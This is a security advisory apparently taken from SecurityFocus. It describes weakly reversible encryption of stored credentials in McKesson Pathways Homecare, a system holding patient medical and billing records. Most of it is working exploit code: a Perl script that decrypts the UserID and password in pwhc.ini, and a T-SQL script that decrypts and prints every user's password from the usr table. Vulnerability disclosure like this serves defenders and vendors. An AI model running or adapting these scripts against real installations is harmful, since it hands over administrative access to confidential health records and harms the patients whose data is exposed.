source: http://www.securityfocus.com/bid/3653/info

McKesson Pathways Homecare is a client/server application which is used to track patient information, billing information and medical records for home care patients.

The administrative username and password are encrypted in the pwhc.ini file on the client system. The encryption method used to store these is very weak and can be easily reversed. 

For the SQL server account:
#! /usr/bin/perl -w

################################################################################
# pwhc_crack.pl -- Extracts a password from a Pathways Homecare PWHC.ini
file
################################################################################

use strict;

open (PWHC, "pwhc.ini") or die "Unable to open .ini file";
while (<PWHC>) {
chomp;
if ($_ =~ /^UserID/) { print "UserID: ", decrypt($_), "\n"; }
if ($_ =~ /^Password/) { print "Password: ", decrypt($_), "\n"; }
}

sub decrypt {
my $counter = 0;
my $key;
my @cryptstr = split /=/, $_, 2;
my @revstr = unpack("c*", (scalar reverse $cryptstr[1]));
if(@revstr % 2) {
$key = 3;
while ($counter < @revstr) {
$revstr[$counter] += $key;
$counter++;
$key += ($counter % 2) ? 5 : -3;
}
}
else {
$key = 7;
while ($counter < @revstr) {
$revstr[$counter] += $key;
$counter++;
$key += ($counter % 2) ? -3 : 5;
}
}
return pack("c*", (reverse @revstr));
}

For the Visual Basic client:
SET NOCOUNT ON
DECLARE @evenkey varchar(15)
DECLARE @oddkey varchar(15)
DECLARE @key varchar(15)
DECLARE @cryptstr varchar(15)
DECLARE @position tinyint
DECLARE @length tinyint
DECLARE @usrid varchar(30)

DECLARE pwd_cursor CURSOR FOR SELECT usrID, pwd FROM usr
OPEN pwd_cursor
FETCH NEXT FROM pwd_cursor INTO @usrID, @cryptstr
SET @evenkey = 'FDHFJHLJNLPNRP'
SET @oddkey = 'CGEIGKIMKOMQOSQ'

WHILE (@@FETCH_STATUS = 0)
BEGIN
SET @position = 1
SET @length = datalength(@cryptstr)
IF ((@length % 2) = 1) SET @key = @oddkey
ELSE SET @key = @evenkey

WHILE (@position <= @length)
BEGIN
SET @cryptstr = STUFF(@cryptstr, (@length - @position) + 1, 1,
CHAR((ASCII(SUBSTRING(@key, @position, 1)) - 65)
+ ASCII(SUBSTRING(@cryptstr, (@length - @position) + 1, 1))))
SET @position = @position + 1
END
PRINT @usrID + ' : ' + @cryptstr
FETCH NEXT FROM pwd_cursor INTO @usrID, @cryptstr
END
DEALLOCATE pwd_cursor
GO